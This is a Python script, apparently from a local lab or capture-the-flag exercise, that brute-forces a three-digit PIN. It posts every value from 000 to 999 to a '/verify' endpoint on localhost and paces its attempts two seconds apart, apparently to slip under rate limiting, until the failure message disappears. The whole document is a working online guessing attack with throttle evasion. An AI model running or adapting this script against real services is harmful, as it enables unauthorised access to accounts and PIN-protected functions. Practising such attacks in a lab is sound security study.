import socket
import time

HOST = '127.0.0.1'
PORT = 8888

for attempt in range(1000):
    start = time.time()

    pin = str(attempt).zfill(3)
    payload = f"magicNumber={pin}"

    request = (
        "POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{payload}"
    )

    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        s.send(request.encode())

        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk

        output = response.decode(errors="ignore")

        if "Incorrect number" not in output:
            print(f"[🎉] SUCCESS! PIN is: {pin}")
            break
        else:
            print(f"Trying PIN {pin} -> wrong")

        s.close()

        elapsed = time.time() - start
        if elapsed < 2.0:
            time.sleep(2.0 - elapsed)

    except Exception as e:
        print(f"[!] Error with {pin}: {e}")
        continue
